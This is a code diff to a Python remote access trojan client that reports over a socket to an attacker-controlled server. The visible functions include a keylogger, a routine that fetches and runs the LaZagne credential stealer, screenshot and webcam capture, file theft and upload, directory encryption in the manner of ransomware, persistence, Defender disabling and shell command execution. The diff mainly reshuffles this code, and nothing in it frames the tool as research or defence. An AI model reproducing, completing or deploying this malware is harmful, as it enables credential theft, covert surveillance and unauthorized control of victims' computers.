@@ -54,9 +54,8 @@ def execute_shell_command(command):
         send_to_server(f"Failed to execute command: {str(e)}")
 
 
+
 _ = 1
-
-
 def keylogger(command, sock):
     global keylogger_instance
     global _
@@ -145,6 +144,8 @@ def keylogger(command, sock):
                 send_to_server("Invalid interval for keylogger command.")
 
 
+
+
 def download_and_extract_lazagne(url, command):
     try:
         tempdir = tempfile.gettempdir()
@@ -156,6 +157,7 @@ def download_and_extract_lazagne(url, command):
         execute_lazagne(int(command.split()[1]))
     except Exception as e:
         send_to_server(f"Failed to download and extract LaZagne: {str(e)}")
+
 
 
 def execute_lazagne(timeout):
@@ -193,6 +195,7 @@ def execute_lazagne(timeout):
         send_to_server(f"Failed to execute LaZagne: {str(e)}")
 
 
+
 def send_to_server(message):
     try:
         message = ">>> " + message
@@ -203,27 +206,6 @@ def send_to_server(message):
     except Exception as e:
         return
 
-
-def execute_shell_command(command):
-    try:
-        command_exec = command[5:][:-2].strip()
-        if command_exec.lower().endswith(".exe"):
-            subprocess.Popen(command_exec, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                             stderr=subprocess.PIPE)
-            send_to_server(f"{command_exec} executed with success")
-        else:
-            process = subprocess.Popen(command_exec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate(timeout=int(command[-2:]))
-            stdout_str = stdout.decode('utf-8', errors='ignore')
-            stderr_str = stderr.decode('utf-8', errors='ignore')
-            if stdout_str.strip():
-                send_to_server(stdout_str.strip())
-            if stderr_str.strip():
-                send_to_server(stderr_str.strip())
-    except subprocess.TimeoutExpired:
-        send_to_server(f"Timeout of{command[-2:]} expired while executing {command[5:][:-2]}")
-    except Exception as e:
-        send_to_server(f"Failed to execute command: {str(e)}")
 
 
 def change_directory(command):
@@ -238,6 +220,7 @@ def change_directory(command):
         send_to_server(f"Failed to change directory: {str(e)}")
 
 
+
 def list_directory():
     try:
         files = os.listdir()
@@ -245,6 +228,7 @@ def list_directory():
         send_to_server(file_list)
     except Exception as e:
         send_to_server(f"Failed to list directory: {str(e)}")
+
 
 
 def capture_screenshot(sock):
@@ -256,6 +240,7 @@ def capture_screenshot(sock):
         send_image_to_server(sock, screenshot_path)
     except Exception as e:
         send_to_server(f"Failed to capture and send screenshot: {str(e)}")
+
 
 
 def upload(command):
@@ -271,6 +256,7 @@ def upload(command):
             send_to_server(f"File {filename} not found.")
     except Exception as e:
         send_to_server(f"Failed to upload file {filename}: {str(e)}")
+
 
 
 def encrypt_directory():
@@ -307,6 +293,7 @@ def encrypt_directory():
         send_to_server(f"Failed to encrypt directory: {str(e)}")
 
 
+
 def decrypt_directory(key):
     try:
         listagem = os.listdir()
@@ -329,6 +316,7 @@ def decrypt_directory(key):
         send_to_server(f"Failed to decrypt directory: {str(e)}")
 
 
+
 def persist_backdoor():
     try:
         backdoor_path = os.path.abspath(sys.argv[0])
@@ -341,12 +329,15 @@ def persist_backdoor():
         send_to_server(f"Failed to persist backdoor: {str(e)}")
 
 
-def download(command):
-    global data
+
+def download(command, sock):
+    data = b''
     parts = command.split(' ', 2)
     cmd, filename = parts
+    print(cmd + " e " + filename)
     try:
         with open(filename, "wb") as file:
+            data = sock.recv(1000000)
             if not data:
                 send_to_server("Error receiving file data.")
                 return
@@ -354,6 +345,7 @@ def download(command):
         send_to_server(f"File {filename} received successfully.")
     except Exception as e:
         send_to_server(f"Failed to download file {filename}: {str(e)}")
+
 
 
 def web_open(command):
@@ -365,6 +357,7 @@ def web_open(command):
         send_to_server(f"Website {url} opened successfully on the client's PC.")
     except Exception as e:
         send_to_server(f"Failed to open website: {str(e)}")
+
 
 
 def pop_up(command):
@@ -381,6 +374,7 @@ def pop_up(command):
         send_to_server(f"Failed to show pop-up: {e}")
 
 
+
 def auto_remove(path):
     try:
         with open(path, 'wb') as f:
@@ -390,6 +384,7 @@ def auto_remove(path):
         send_to_server(f"File {path} deleted with success")
     except Exception as e:
         send_to_server(f"Failed to delete file {f}: {str(e)}")
+
 
 
 def get_system_info():
@@ -465,6 +460,7 @@ def get_system_info():
         send_to_server(f"Failed to retrieve system information: {str(e)}")
 
 
+
 def disable_defender():
     try:
         commands = [
@@ -491,11 +487,13 @@ def disable_defender():
             f"Failed in the try of disable defender: {e} / Have you permission? / Maybe the AV has detected you")
 
 
+
 def is_admin():
     try:
         return windll.shell32.IsUserAnAdmin()
     except:
         return False
+
 
 
 def ask_permission():
@@ -504,6 +502,7 @@ def ask_permission():
         send_to_server("Now, you're admin!")
     else:
         send_to_server("You already are admin.")
+
 
 
 def send_image_to_server(sock, filename):
@@ -522,9 +521,6 @@ def send_image_to_server(sock, filename):
 
     except Exception as e:
         send_to_server(f"Failed to send image: {e}")
-
-
-
 
 
 
@@ -553,7 +549,6 @@ def grab_cam(sock):
         cap.release()
     except Exception as e:
         send_to_server(f"Failed to grab webcam: {e}")
-
 
 
 
@@ -588,6 +583,7 @@ def get_help_message():
         send_to_server(f"Failed to retrieve help message: {str(e)}")
 
 
+
 def handle_command(command):
     if command.startswith("exec"):
         execute_shell_command(command)
@@ -598,7 +594,7 @@ def handle_command(command):
     elif command.startswith("screenshot"):
         capture_screenshot(sock)
     elif command.startswith("upload"):
-        pass
+        download(command, sock)
     elif command.startswith("persist"):
         persist_backdoor()
     elif command.startswith("get_system_info"):
@@ -633,21 +629,16 @@ def handle_command(command):
         sock.close()
 
 
+
 def main():
-    command = "null"
-    global data
     try:
         while True:
-            cache = command
-            if cache.startswith("upload"):
-                data = sock.recv(1000000)
-                download(cache)
             command = sock.recv(1024).decode()
             handle_command(command)
-
     except Exception as e:
         send_to_server(f"Error: {str(e)}")
         main()
+
 
 
 if __name__ == "__main__":
